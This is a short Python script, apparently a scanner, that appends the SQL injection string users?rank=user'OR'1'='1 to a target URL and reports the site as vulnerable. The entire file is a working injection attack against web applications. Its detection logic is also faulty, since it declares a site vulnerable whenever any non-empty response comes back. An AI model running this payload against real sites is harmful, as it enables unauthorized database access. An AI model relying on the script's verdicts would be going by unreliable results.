import sys
import urllib
import urllib.request


class Injection_2(object):
	def __init__(self, url):
		self.url = url

	def inject(self):
		attack = "users?rank=user'OR'1'='1"
		resp = urllib.request.urlopen(self.url + attack)
		resp_text = resp.read()
		response = resp_text.decode('utf-8')
		print(response[1])
		if response:
			results = "This site is vulnerable to sql injection\nThe injection used was: " + attack
		else:
			results = "The website is not classic SQL injection vulnerable, maybe try another string"
		return results
